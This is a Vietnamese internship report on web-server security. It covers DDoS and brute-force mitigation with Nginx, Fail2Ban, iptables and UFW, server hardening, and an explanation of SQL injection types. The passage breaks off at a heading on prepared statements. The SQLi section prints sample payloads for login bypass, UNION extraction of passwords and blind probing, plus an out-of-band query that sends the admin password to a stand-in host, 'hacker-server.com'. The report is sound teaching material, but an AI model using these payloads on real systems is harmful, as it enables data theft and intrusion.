# BÁO CÁO THỰC TẬP NGÀY 4/5 

---


# I. BẢO MẬT WEB SERVER

## 1. Phòng chống DDoS. Brute Force 

### 1.1 Tấn công Dos và DDoS (Distributed Denial of Service)

Tấn công Dos là gì?
Dos hay Denial of Service là hình thức tấn công làm quá tải máy chủ bằng cách tạo ra một lượng rất lớn các truy cập. DOS là tấn công từ chối dịch vụ khiến máy chủ không kịp xử lý kịp các tác vụ cần kíp, từ đó dẫn đến quá tải và ngừng hoạt động.

Dos là hình thức tấn công từ chối dịch vụ được dùng để làm quá tải máy tính mục tiêu

Mục tiêu của các cuộc tấn công Dos thường là VPS hoặc web server của ngân hàng, các trang thương mại điện tử,… Tuy nhiên, Dos chỉ xuất phát từ một địa điểm duy nhất và chỉ có 1 dải IP nên có thể bị phát hiện dễ dàng và ngăn chặn đượ

**DDos là gì ?**

DDoS (Từ chối dịch vụ phân tán) là nỗ lực làm sập một trang web hoặc máy chủ bằng cách áp đảo nó với một lượng lớn traffic (lưu lượng truy cập) từ nhiều nguồn khác nhau.
Những nguồn này thường là một mạng "botnet" gồm hàng ngàn máy tính, camera an ninh, hoặc thiết bị IoT đã bị nhiễm mã độc và bị hacker điều khiển. 
Hậu quả là máy chủ cạn kiệt tài nguyên (CPU, RAM, băng thông) và không thể phục vụ các người dùng hợp lệ.
Máy chủ web chỉ có thể xử lý một số yêu cầu cùng một lúc, như vậy nếu như một kẻ tấn công gởi quá nhiều các yêu cầu để làm cho máy chủ đó bị quá tải và nó sẽ không thể xử lý các yêu cầu khác của bạn. Đây chính là một cuốc tấn công “từ chối dịch vụ” vì bạn không thể truy cập vào trang web hay dịch vụ đó nữa.


**Lý Do**

Để có thể ngăn chặn tấn công Server bị DDoS, trước hết cần biết các động lực để thúc đẩy Server bị DDoS là gì. Hiện nay, Server bị DDoS xảy ra nhằm một số mục đích như sau:

Tài chính: Tấn công Server bị DDoS thường được kết hợp với tấn công ransomeware. Những kẻ tấn công thường là một phần của một nhóm tội phạm có tổ chức. Thậm chí, các doanh nghiệp đối thủ cũng có thể thực hiện tấn công Server bị DDoS để có được lợi thế cạnh tranh.
Bất đồng về ý thức hệ: Các cuộc tấn công thường nhắm vào các cơ quan quản lý hay các nhóm biểu tình áp bực trong chính trị. Những cuộc tấn công này thường được tiến hành để hỗ trợ một hệ thống chính trị hay tôn giáo cụ thể.
Chiến thuật: Trong trường hợp này, tấn công Server bị DDoS thường chỉ là một phần trong các chiến dịch lớn. Đôi khi, các chiến dịch còn kết hợp với tấn công vật lý hay tấn công phần mềm.
Thương mại: Tấn công Server bị DDoS có thể thu thập được những thông tin hoặc gây thiệt hại cho các ngành công nghiệp cụ thể. Lấy ví dụ, các cuộc tấn công vào Sony, British Airways…khiến người tiêu dùng mất niềm tin vào cả ngành công nghiệp ấy.
Tống tiền: Các cuộc tấn công có thể được sử dụng cho các lợi ích cá nhân, hoặc thậm chí tống tiền.
Tấn công do nhà nước: Một số cuộc tấn công Server bị DDoS được tiến hành nhằm gây rối loạn trong quân sự cũng như người dân.

**Cách cấu hình phòng chống trên Web Server (Nginx):**
Việc phòng thủ DDoS triệt để chỉ bằng web server là rất khó nếu lưu lượng tấn công quá lớn (bạn sẽ bị nghẽn ở tầng mạng trước). Tuy nhiên, cấu hình web server tốt sẽ giúp bạn chống lại các đợt DDoS quy mô nhỏ hoặc tấn công ở tầng ứng dụng (Layer 7 HTTP Flood, Slowloris):

*   **Giới hạn tốc độ request (Rate Limiting):** Ngăn một IP gửi quá nhiều yêu cầu trong một giây.

*   Mở file cấu hình chính /etc/nginx/nginx.conf:
  
    ```nginx
    # Đặt ở context 'http'
    limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;

    # Đặt ở context 'server' hoặc 'location'
    limit_req zone=mylimit burst=20 nodelay;
    ```
<img width="964" height="245" alt="image" src="https://github.com/user-attachments/assets/ca2b1638-d65d-4139-96e3-eb3f83ecbe8e" />

*   **Giới hạn số lượng kết nối (Connection Limiting):** Giới hạn số kết nối đồng thời từ một IP duy nhất để tránh bị chiếm dụng tài nguyên.
    ```nginx
    # Đặt ở context 'http'
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    # Đặt ở context 'server'
    limit_conn addr 10;
    ```

  <img width="780" height="325" alt="image" src="https://github.com/user-attachments/assets/02bb79a9-15ee-42e9-8b0e-eab081d70ad5" />


*   **Giảm Timeouts:** Chống lại tấn công Slowloris (kẻ tấn công cố tình mở kết nối và gửi dữ liệu cực kỳ chậm để giữ kết nối mở mãi mãi).
*   Đặt trong khối server{}
  
    ```nginx
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 5s 5s;
    send_timeout 10s;
    ```
Khởi động lại Nginx: sudo systemctl restart nginx

  <img width="553" height="266" alt="image" src="https://github.com/user-attachments/assets/7cdbccfe-e62f-4b7e-ba91-ef1bc541c721" />

*   **Sử dụng WAF và Reverse Proxy :** Trong thực tế hệ thống lớn, bạn nên đưa trang web ra sau một dịch vụ như Cloudflare hoặc AWS Shield. Các dịch vụ này sẽ hứng chịu và lọc traffic DDoS ở các trung tâm dữ liệu khổng lồ trước khi request sạch chạm đến web server thực sự của bạn.


**Tối ưu tầng Hệ Điều Hành (Linux Kernel)**
Web server chỉ lo Tầng 7. Bạn cần yêu cầu Kernel Linux tự vệ trước các cuộc tấn công cạn kiệt tài nguyên mạng (như SYN Flood - Tầng 4).
Mở file /etc/sysctl.conf:

Bash
sudo nano /etc/sysctl.conf
Thêm hoặc sửa các dòng sau ở cuối file:


# Bật TCP SYN Cookies để chặn SYN Flood
net.ipv4.tcp_syncookies = 1

# Giảm thời gian lưu giữ kết nối đang đóng
net.ipv4.tcp_fin_timeout = 15

# Cho phép tái sử dụng các socket trạng thái TIME-WAIT nhanh hơn
net.ipv4.tcp_tw_reuse = 1

# Tăng giới hạn số lượng kết nối tối đa (Backlog) chờ xử lý
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535
Áp dụng ngay các thay đổi mạng:

sudo sysctl -p

<img width="1209" height="804" alt="image" src="https://github.com/user-attachments/assets/45272273-6763-4821-b8bf-e7f1a5c36027" />

---

### 1.2. Tấn công Brute-force

Brute-force (Tấn công vét cạn) là hình thức tấn công "thử và sai". Kẻ tấn công sẽ sử dụng phần mềm tự động để thử hàng ngàn, thậm chí hàng triệu tổ hợp tên đăng nhập và mật khẩu
khác nhau cho đến khi tìm ra thông tin đúng để xâm nhập vào hệ thống. Mục tiêu thường là các trang đăng nhập admin (như `/wp-login.php`), cổng SSH, hoặc API.

Các cuộc tấn công này thường được tự động hóa bằng cách sử dụng danh sách các từ gồm tên người dùng và mật khẩu thường được sử dụng để có thể đạt được kết quả tốt nhất.
Việc sử dụng các công cụ chuyên dụng có khả năng cho phép hacker thực hiện đăng nhập 1 cách tự động nhiều lần với tốc độ cao.

**Mục đích**
Việc đánh cắp được mật khẩu người dùng luôn đi kèm với những hậu quả vô cùng nghiêm trọng. Có thể nhìn thấy ngay, nạn nhân của Brute Force Attack sẽ bị lộ thông tin đăng nhập và toàn bộ thông tin của tài khoản đó.

Mức độ nghiêm trọng sẽ tùy thuộc vào loại thông tin bị rò rỉ. Nếu tài khoản bị đánh cắp là tài khoản quan trọng của 1 tổ chức nào đó thì cơ sở dữ liệu nhạy cảm từ toàn bộ tổ chức có thể bị lộ trong các vụ vi phạm dữ liệu cấp công ty .

Ngoài ra, việc Brute-Force với tần suất cao có thể coi như 1 kiểu tấn công DOS vào hệ thống web đó dẫn tới có thể treo cả server nếu server đó yếu.

**Các công cụ**
Tấn công brute-force bao gồm các ứng dụng bẻ khóa mật khẩu, bẻ khóa các tổ hợp tên người dùng và mật khẩu mà sẽ rất khó để một người tự bẻ khóa. Các công cụ tấn công brute-force thường được sử dụng bao gồm:

a. Aircrack-ng:
Một bộ công cụ đánh giá an ninh mạng Wi-Fi để giám sát và xuất dữ liệu và tấn công một tổ chức thông qua các phương pháp như điểm truy cập giả mạo và chèn gói.

b. John the Ripper:
Một công cụ khôi phục mật khẩu mã nguồn mở hỗ trợ hàng trăm loại mật mã và băm, bao gồm mật khẩu người dùng cho macOS, Unix và Windows, máy chủ cơ sở dữ liệu, ứng dụng web, lưu lượng truy cập mạng, khóa cá nhân được mã hóa và tệp tài liệu.

c. Hydra:
Hydra là một nền tảng mở, được cộng đồng bảo mật và những kẻ tấn công liên tục phát triển các mô-đun mới. Nó có thể tấn công hơn 50 giao thức và trên nhiều hệ điều hành khác nhau.

d. L0phtCrack:
Một công cụ bẻ khóa mật khẩu Windows. Nó sử dụng bảng cầu vồng, từ điển và các thuật toán đa xử lý.

e. Burpsuite:
Burpsuite không phải là 1 công cụ chuyên dụng để tấn công brute-force, tuy nhiên bạn hoàn toàn có thể tùy chỉnh đầu vào bộ mật khẩu để hướng tới 1 cuộc tấn công brute-force tùy ý.

**Cách cấu hình phòng chống trên Web Server:**

Khác với DDoS nhắm vào việc làm cạn kiệt tài nguyên mạng hoặc máy chủ, Brute-force nhắm thẳng vào **Logic Ứng dụng** (Application Layer), cụ thể là các form đăng nhập, API endpoint xác thực, hoặc cổng SSH. Mục tiêu của chúng là dò rỉ mật khẩu.

Dưới đây là các lớp cấu hình từ Web Server cho đến Tường lửa hệ điều hành để ngăn chặn các cuộc tấn công này.

---

### Lớp 1: Cấu hình ngay trên Nginx / Apache

Web server có thể làm giảm nhịp độ dò mật khẩu bằng cách giới hạn khắt khe tốc độ truy cập vào các đường dẫn nhạy cảm.

#### 1. Trên Nginx: Bóp nghẹt trang đăng nhập
Bạn không nên áp dụng giới hạn tốc độ của toàn bộ trang web cho trang đăng nhập. Hãy tạo một `zone` riêng cực kỳ khắt khe chỉ dành cho URL này.

```nginx
http {
    # ...
    # Tạo một zone riêng cho trang login, giới hạn 1 request mỗi 2 giây (30r/m)
    limit_req_zone $binary_remote_addr zone=login_limit:10m rate=30r/m;
    # ...
}

server {
    # ...
    # Giả sử ứng dụng backend của bạn có các route đăng nhập chuẩn
    # (như /login của Flask hoặc /admin/login/ của Django)
    location ~* /(login|admin/login|api/auth) {
        # Áp dụng giới hạn: Chỉ cho phép "xếp hàng" tối đa 5 request, 
        # vượt quá sẽ bị trả về lỗi 503 ngay lập tức.
        limit_req zone=login_limit burst=5 nodelay;
        
        # Chuyển tiếp request vào ứng dụng backend qua proxy_pass hoặc uwsgi_pass...
    }
}
```

#### 2. Thêm lớp khiên "Basic Authentication"
Nếu bạn có các trang quản trị nội bộ (không dành cho khách hàng), đừng để form đăng nhập của ứng dụng phơi ra ngoài Internet. Hãy dùng Web Server chặn lại bằng HTTP Basic Auth. Kẻ tấn công sẽ phải qua được lớp mật khẩu của Nginx/Apache trước khi nhìn thấy giao diện web của bạn.

**Tạo file chứa mật khẩu (Yêu cầu cài đặt gói `apache2-utils`):**
```bash
sudo htpasswd -c /etc/nginx/.htpasswd admin_user
# Hệ thống sẽ hỏi bạn nhập mật khẩu cho user này
```

**Cấu hình trên Nginx:**
```nginx
location /admin-portal/ {
    auth_basic "Khu vuc quan tri noi bo";
    auth_basic_user_file /etc/nginx/.htpasswd;
    # ...
}
```

**Cấu hình trên Apache (`.htaccess` hoặc file conf):**
```apache
<Directory "/var/www/html/admin-portal">
    AuthType Basic
    AuthName "Khu vuc quan tri noi bo"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
```

---

### Lớp 2: Sử dụng Tường lửa Động với Fail2Ban (Vũ khí tối thượng)

Chỉ dùng Web Server là chưa đủ. Kẻ tấn công có thể cứ dò 1 pass / 3 giây (để lách Rate Limit). Lúc này, **Fail2Ban** là công cụ tiêu chuẩn trong giới quản trị hệ thống Linux để giải quyết triệt để.

Fail2Ban sẽ "đọc lén" file log của Nginx/Apache. Bất cứ IP nào sinh ra lỗi `401 Unauthorized` (sai tài khoản) hoặc `403 Forbidden` quá nhiều lần, nó sẽ cập nhật Tường lửa (iptables/UFW) để cấm cửa IP đó ở tầng mạng trong thời gian quy định.

**Bước 1: Cài đặt**
```bash
sudo apt update
sudo apt install fail2ban
```
<img width="1277" height="387" alt="image" src="https://github.com/user-attachments/assets/d81b6da5-667a-47a5-abdb-518d1e0e6a09" />

**Bước 2: Tạo cấu hình Jail cục bộ**
Không sửa file gốc `jail.conf`, hãy tạo một file copy:
```bash
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

**Bước 3: Kích hoạt bộ lọc cho Nginx/Apache**
Trong file `jail.local`, tìm đến phần cấu hình của Nginx/Apache và bật nó lên:

```ini
[nginx-http-auth]
# Bắt các lỗi đăng nhập sai (Basic Auth thất bại)
enabled  = true
port     = http,https
logpath  = /var/log/nginx/error.log
# Khóa 1 giờ nếu sai 3 lần trong 10 phút
findtime = 600
maxretry = 3
bantime  = 3600

[nginx-botsearch]
# Chặn các bot dò quét URL mặc định (như /wp-admin, /phpmyadmin)
enabled  = true
port     = http,https
logpath  = /var/log/nginx/access.log
maxretry = 2
bantime  = 86400 # Khóa 1 ngày
```
<img width="1165" height="726" alt="image" src="https://github.com/user-attachments/assets/13168dac-c9d5-432a-b1f5-19771118a10c" />

Khởi động lại Fail2Ban: `sudo systemctl restart fail2ban`

---

### Lớp 3: Giới hạn IP ở Tầng Mạng (Whitelisting)

Đây là cách phòng chống **tuyệt đối nhất** nhưng chỉ áp dụng được nếu hệ thống hoặc API của bạn chỉ phục vụ một số đối tượng cố định (ví dụ: một hệ thống quản lý giao nhận nội bộ chỉ dành cho chủ bãi xe hoặc nhân viên).

Nếu bạn biết chắc IP nguồn, hãy chặn tất cả phần còn lại:

**Trên Nginx:**
```nginx
location /system-admin/ {
    allow 192.168.1.0/24;  # Dải IP mạng LAN công ty
    deny all;              # Chặn toàn bộ 
}
```

---

### Lớp 4: Tầng Ứng Dụng (Application Layer - Chốt chặn cuối)

Nếu kẻ tấn công sở hữu một mạng Botnet, chúng sẽ luân chuyển IP liên tục. IP A thử 1 pass, IP B thử 1 pass. Lúc này Web Server và Fail2Ban hoàn toàn "mù" vì mỗi IP chỉ vi phạm 1 lần (không vượt ngưỡng Rate Limit).

Lúc này, lớp phòng thủ bắt buộc phải nằm ở logic code ứng dụng web backend của bạn. Dù bạn xây dựng API hay giao diện web, luôn cần có:

1.  **Account Lockout (Khóa tài khoản):** Khi tài khoản `admin` bị nhập sai pass 5 lần (dù từ bất kỳ IP nào), tạm khóa tài khoản đó trong 15 phút.
2.  **CAPTCHA / reCAPTCHA:** Bật lên sau 2-3 lần đăng nhập sai để chặn đứng các tool tự động.
3.  **Không tiết lộ user tồn tại:** Nếu nhập sai, luôn trả về thông báo chung chung: *"Tên đăng nhập hoặc mật khẩu không đúng"*. Đừng bao giờ trả về thông báo *"Tài khoản không tồn tại"* — kẻ tấn công sẽ dùng nó để lọc ra danh sách username hợp lệ trước khi brute-force mật khẩu.
---


## 2.Cấu hình firewall

#### 2.1. IPtables

IPtables là ứng dụng tường lửa miễn phí trong Linux, cho phép thiết lập các quy tắc riêng để kiểm soát truy cập và tăng tính bảo mật. Về bản chất, IPtables chỉ là giao diện dòng lệnh để tương tác với packet filtering của netfilter framework. Cơ chế packet filtering của IPtables hoạt động dựa trên 3 thành phần chính: Tables, Chains và Targets.


 Cấu hình cơ bản IPtables

**Bước 1: Cài đặt IPtables**

Hầu hết các bản phân phối Linux hiện nay đều tích hợp sẵn IPtables. Nếu chưa có, có thể cài đặt trên Ubuntu/Debian bằng lệnh:

```bash
sudo apt-get update
sudo apt-get install iptables
```

Kiểm tra các rule và danh sách hiện tại:

```bash
sudo iptables -L -v
```


Khi định nghĩa một rule, tức là thêm nó vào danh sách các quy tắc kiểm duyệt của firewall. Cú pháp tổng quát:

```bash
sudo iptables -A <chain> -i <interface> -p <protocol> -s <source_ip> --dport <port> -j <target>
```

**1. Xóa cấu hình cũ**
```bash
iptables -F
iptables -X
```
**Giải thích:** `-F` (Flush) xóa toàn bộ các quy tắc hiện có. `-X` xóa các chuỗi (chains) do người dùng tự tạo. Lệnh này dọn sạch tường lửa để bạn cấu hình từ đầu, tránh bị xung đột với các rules cũ.

---

**2. Giữ phiên kết nối hiện tại**
```bash
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
```
**Giải thích:** `--ctstate ESTABLISHED,RELATED` cho phép các gói tin thuộc về phiên kết nối đang hoạt động được đi qua. Lệnh này cực kỳ quan trọng để giữ cho phiên SSH hiện tại của bạn không bị đứt mạng giữa chừng khi cấu hình.

---

**3. Cho phép mạng nội bộ (Localhost)**
```bash
iptables -A INPUT -i lo -j ACCEPT
```
**Giải thích:** `-i lo` cho phép luồng dữ liệu đi qua cổng mạng nội bộ (127.0.0.1). Điều này bắt buộc phải có để các dịch vụ trên cùng một máy chủ (ví dụ: Nginx kết nối với MySQL) có thể giao tiếp được với nhau.

---

**4. Mở cổng SSH**
```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```
**Giải thích:** Cho phép giao thức TCP (`-p tcp`) đi vào cổng 22 (`--dport 22`) để bạn có thể quản trị server. (Nhớ đổi số 22 nếu server của bạn dùng cổng SSH khác).

---

**5. Mở cổng Web Server**
```bash
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```
**Giải thích:** Cho phép kết nối TCP từ bên ngoài vào cổng 80 (HTTP) và cổng 443 (HTTPS) để người dùng có thể truy cập được vào website của bạn.

---

**6. Chặn các gói tin lỗi/dị dạng**
```bash
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
```
**Giải thích:** `--ctstate INVALID` phát hiện các gói tin bị lỗi, dị dạng hoặc không theo chuẩn. `-j DROP` sẽ lập tức vứt bỏ các gói tin này để phòng ngừa hacker dùng chúng để quét lỗi (port scan) hoặc làm treo server.

---

**7. Giới hạn Ping (Chống Ping Flood)**
```bash
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```
**Giải thích:** Lệnh đầu tiên (`--limit 1/s`) chỉ cho phép tối đa 1 gói tin Ping đi qua tường lửa mỗi giây. Lệnh thứ hai sẽ `DROP` (vứt bỏ) tất cả các gói tin Ping vượt quá giới hạn đó. Cách này giúp chống lại kiểu tấn công gửi hàng triệu lệnh ping cùng lúc.

---

**8. Chống DDoS cơ bản (Giới hạn kết nối đồng thời)**
```bash
iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset
iptables -A INPUT -p tcp --syn --dport 443 -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset
```
**Giải thích:** `--connlimit-above 50` phát hiện nếu có một IP tạo quá 50 kết nối mới đồng thời vào server. Nếu vượt quá, `-j REJECT --reject-with tcp-reset` sẽ chủ động đánh bật kết nối đó ra để ngăn kẻ tấn công làm cạn kiệt tài nguyên (RAM/CPU) của máy chủ.

---

**9. Thiết lập chính sách mặc định (Chặn tất cả)**
```bash
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
```
**Giải thích:** Lệnh `-P` (Policy) thiết lập luật chơi chung. Sau khi đối chiếu từ bước 1 đến 8, nếu một gói tin gửi đến không hợp lệ, không phải web, không phải SSH... thì nó sẽ tự động bị `DROP` (chặn đứng). Chiều gửi ra (`OUTPUT`) được để `ACCEPT` cho server thoải mái gửi phản hồi và tải file từ internet về.

<img width="1828" height="651" alt="image" src="https://github.com/user-attachments/assets/d4fa201a-33cb-4c78-8c3d-98df50622c5e" />


**2.2 Cấu hình CloudFlare**

Cấu hình chuiyeern
<img width="1436" height="815" alt="image" src="https://github.com/user-attachments/assets/1d860369-540d-457f-8c65-0fc34f5ba3de" />

**3. Hardening server**

Việc làm cứng (hardening) máy chủ web Linux là một bước tối quan trọng để bảo vệ dữ liệu và duy trì hiệu suất. Thay vì chỉ cài đặt , bạn cần biến máy chủ được setup chặt chẽ hơn, tăng tính bảo mật và giảm thiểu bề mặt tấn công.


---

## 1. Cập nhật hệ thống và Quản lý người dùng
Trước khi cấu hình bất cứ thứ gì, hãy đảm bảo nền tảng của bạn sạch và được cập nhật.

*   **Cập nhật Repository và Package:** 
    `sudo apt update && sudo apt upgrade -y` 
*   **Vô hiệu hóa tài khoản Root:** Không bao giờ SSH trực tiếp bằng user `root`. Hãy sử dụng một user có quyền `sudo`.
    *   Chỉnh sửa `/etc/ssh/sshd_config`: `PermitRootLogin no`
*   **Sử dụng SSH Key:** Thay thế mật khẩu truyền thống bằng SSH Key (RSA 4096-bit hoặc Ed25519) để chống tấn công Brute-force.

---

## 2. Tắt các dịch vụ không cần thiết
Mỗi dịch vụ đang chạy là một cánh cửa mở. Càng ít dịch vụ, bề mặt tấn công càng nhỏ.

### Kiểm tra các dịch vụ đang chạy:
Sử dụng lệnh sau để xem những gì đang "nghe" (listen) trên các cổng:
`sudo netstat -tulpn` hoặc `sudo ss -tulpn`

<img width="1402" height="768" alt="image" src="https://github.com/user-attachments/assets/451366a5-f666-4b50-8325-1e893045c1e2" />

### Các dịch vụ thường dư thừa:
*   **Legacy services:** `rsh`, `rlogin`, `telnet`, `ftp` (thay bằng SFTP/SSH).
*   **Dịch vụ in ấn:** `cups`.
*   **Dịch vụ quản lý từ xa cũ:** `avahi-daemon`.



**Cách tắt:**
```bash
sudo systemctl stop <tên_dịch_vụ>
sudo systemctl disable <tên_dịch_vụ>
```

---

## 3. Cấu hình Firewall (Tường lửa)
Chỉ cho phép các cổng thực sự cần thiết. Thông thường đối với Web Server là:
*   **80** (HTTP)
*   **443** (HTTPS)
*   **SSH** (Cổng tùy chỉnh, ví dụ: 2222 thay vì 22)

**Sử dụng UFW (Uncomplicated Firewall) trên Ubuntu:**
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 443/tcp
sudo ufw allow 80/tcp
sudo ufw allow <your_custom_ssh_port>/tcp
sudo ufw enable
```

---

## 4. Bảo mật Web Server (Nginx/Apache)
Khi phần mềm web đã chạy, bạn cần cấu hình để nó không "tiết lộ" quá nhiều thông tin.

*   **Ẩn phiên bản phần mềm:**
    *   **Nginx:** Trong `nginx.conf`, thêm `server_tokens off;`.
    *   **Apache:** Trong `security.conf`, chỉnh `ServerTokens Prod` và `ServerSignature Off`.
*   **Cài đặt chứng chỉ SSL/TLS:** Sử dụng Let's Encrypt (Certbot) để mã hóa toàn bộ lưu lượng truy cập.
*   **Cấu hình HTTP Headers bảo mật:** Thêm các header như `X-Frame-Options`, `X-Content-Type-Options`, và `Content-Security-Policy` để chống lại các cuộc tấn công XSS hoặc Clickjacking.



---

## 5. Cài đặt các công cụ giám sát và chống xâm nhập
*   **Fail2Ban:** Tự động chặn các địa chỉ IP có hành vi dò mật khẩu quá nhiều lần.
*   **ModSecurity:** Một Web Application Firewall (WAF) mã nguồn mở giúp ngăn chặn SQL Injection và XSS ngay từ tầng ứng dụng.
*   **AIDE (Advanced Intrusion Detection Environment):** Kiểm tra tính toàn vẹn của file hệ thống để phát hiện xem có hacker nào đã thay đổi file cấu hình của bạn hay chưa.

---

## 6. Cấu hình phân vùng và Quyền hạn file
*   **Phân vùng riêng:** Nếu có thể, hãy tách `/var/log`, `/tmp`, và `/home` ra các phân vùng riêng để tránh việc log đầy làm treo toàn bộ hệ thống (tấn công DoS cục bộ).
*   **Quyền sở hữu:** Đảm bảo các file web (`/var/www/html`) thuộc sở hữu của user phù hợp (như `www-data` hoặc `nginx`) và không có quyền ghi (`write`) bừa bãi.

> **Lưu ý quan trọng:** Luôn sao lưu (backup) các file cấu hình trước khi chỉnh sửa. Một thay đổi nhỏ trong SSH config có thể khiến bạn bị văng ra khỏi server vĩnh viễn.

**4.  Xử lý các lỗ hổng (SQL injection, XSS, CSRF).**

**4.1 Sqli**

SQL Injection (SQLi) là kỹ thuật tấn công trong đó hacker chèn mã SQL độc hại vào các truy vấn SQL mà ứng dụng thực hiện. Mục tiêu chính là can thiệp vào các truy vấn, dẫn đến việc đánh cắp, thay đổi, hoặc xóa dữ liệu mà không có sự cho phép.

Ví dụ: 
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
hacker có thể chèn vào kí tự vào để bỏ qua việc check password

SELECT * FROM users WHERE username = 'admin' --' AND password = 'password123';

Trong ví dụ mình đưa ra trên thì, -- là ký tự comment trong SQL, làm cho phần còn lại của truy vấn bị bỏ qua, dẫn đến việc bỏ qua phần kiểm tra password.

2. Các dạng tấn công SQL Injection
Có nhiều dạng SQL Injection khác nhau mà hacker có thể sử dụng để khai thác ứng dụng của bạn. Mình sẽ nêu một vài dạng phổ biến:

### a. In-band SQLi (Classic SQLi)
Đây là dạng tấn công trực diện nhất, nơi hacker nhận kết quả ngay lập tức thông qua phản hồi của trang web.

*   **Error-based SQLi (Dựa trên thông báo lỗi):**
    *   **Mục tiêu:** Ép database hiển thị cấu trúc thông qua lỗi hệ thống.
    *   **Ví dụ:** Hacker nhập `'` vào ô tìm kiếm. Nếu server trả về lỗi: `SQL syntax error near '''' at line 1`, hacker biết rằng ứng dụng đang nối chuỗi trực tiếp và bắt đầu dò tìm tên bảng.
*   **Union-based SQLi (Dựa trên toán tử UNION):**
    *   **Mục tiêu:** Kết hợp kết quả từ một bảng khác vào kết quả hiển thị.
    *   **Câu lệnh gốc:** `SELECT name, description FROM products WHERE id = [ID]`
    *   **Ví dụ tấn công:** Hacker nhập ID là `1 UNION SELECT username, password FROM users`.
    *   **Kết quả:** Trang web thay vì hiển thị thông tin sản phẩm sẽ hiển thị danh sách tài khoản và mật khẩu của người dùng.



---

### b. Inferential SQLi (Blind SQLi)
Dạng này nguy hiểm vì nó diễn ra "ngầm". Hacker không thấy dữ liệu trả về trực tiếp mà phải suy luận từ phản ứng của server.

*   **Boolean-based (Dựa trên logic Đúng/Sai):**
    *   **Mục tiêu:** Dò từng ký tự của dữ liệu.
    *   **Câu lệnh gốc:** `SELECT * FROM articles WHERE id = 1`
    *   **Ví dụ tấn công:** Hacker gửi yêu cầu với ID: `1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'`.
    *   **Kết quả:** Nếu trang web hiển thị nội dung bài viết bình thường, hacker biết ký tự đầu tiên của mật khẩu admin là 'a'. Nếu trang web báo "Không tìm thấy", ký tự đó không phải là 'a'.
*   **Time-based (Dựa trên độ trễ thời gian):**
    *   **Mục tiêu:** Xác định thông tin khi trang web không thay đổi nội dung dù truy vấn đúng hay sai.
    *   **Ví dụ tấn công:** Hacker gửi: `1; IF (SELECT user() = 'sa') WAITFOR DELAY '0:0:10'`.
    *   **Kết quả:** Nếu trình duyệt xoay vòng đợi đúng 10 giây mới tải xong trang, hacker biết chắc chắn tài khoản đang chạy database là `sa` (System Admin).

---

### c. Out-of-band SQLi
Đây là kỹ thuật nâng cao khi hacker điều khiển database thực hiện một kết nối ra bên ngoài.

*   **Mục tiêu:** Lấy dữ liệu khi các kênh phản hồi thông thường bị chặn hoặc không ổn định.
*   **Ví dụ tấn công (trên Oracle):** Hacker chèn một câu lệnh yêu cầu database truy cập vào một domain do hacker kiểm soát:
    `SELECT utl_http.request('[http://hacker-server.com/](http://hacker-server.com/)'||(SELECT pass FROM users WHERE user='admin')) FROM dual;`
*   **Kết quả:** Database sẽ tự động gửi một yêu cầu HTTP đến server của hacker, đính kèm mật khẩu admin ngay trong đường dẫn (URL).

---

### Tóm tắt logic tấn công qua ví dụ kinh điển:
Giả sử form đăng nhập có câu lệnh: 
`SELECT * FROM users WHERE username = '$user' AND password = '$pass'`

Hacker chỉ cần nhập vào ô username: `admin' --` (dấu `--` để comment/vô hiệu hóa phần còn lại).
Câu lệnh trở thành:
`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`
**Hậu quả:** Hacker đăng nhập thành công vào tài khoản admin mà không cần biết mật khẩu.
3. Các hậu quả của SQL Injection

3. Các hậu quả nghiêm trọng của SQL Injection
SQL Injection được coi là một trong những lỗ hổng nguy hiểm nhất vì nó đánh thẳng vào "trái tim" dữ liệu của doanh nghiệp.

a. Rò rỉ và mất mát dữ liệu nhạy cảm
Hacker có thể trích xuất toàn bộ danh sách người dùng, bao gồm tên đăng nhập, mật khẩu (thậm chí là mật khẩu đã mã hóa), số thẻ tín dụng và thông tin cá nhân. Điều này dẫn đến vi phạm quyền riêng tư nghiêm trọng và các rắc rối pháp lý (như vi phạm GDPR hoặc Nghị định 13 tại Việt Nam).

b. Phá hủy tính toàn vẹn của dữ liệu
Không chỉ dừng lại ở việc đọc, hacker có thể thực hiện các lệnh UPDATE hoặc DELETE.

Ví dụ: Thay đổi số dư tài khoản ngân hàng, xóa sạch lịch sử giao dịch, hoặc thay đổi thông tin bài viết trên website để bôi nhọ uy tín tổ chức.

c. Chiếm quyền điều khiển máy chủ (RCE)
Trong một số cấu hình hệ thống yếu kém (đặc biệt là với SQL Server hoặc PostgreSQL), hacker có thể sử dụng các hàm hệ thống (như xp_cmdshell) để thực thi lệnh trực tiếp trên hệ điều hành. Từ đó, chúng có thể cài mã độc, biến server thành botnet hoặc tấn công leo thang vào mạng nội bộ của công ty.

d. Ảnh hưởng nặng nề về kinh tế và uy tín
Gián đoạn kinh doanh: Website phải đóng cửa để khắc phục sự cố.

Mất lòng tin: Khách hàng sẽ rời bỏ dịch vụ khi biết thông tin cá nhân của họ không được bảo vệ.

Chi phí khắc phục: Chi phí cho việc điều tra số hóa (forensics), nộp phạt và khôi phục hệ thống thường rất lớn.

4.1 Sử dụng Prepared Statements (Câu lệnh chuẩn hóa)
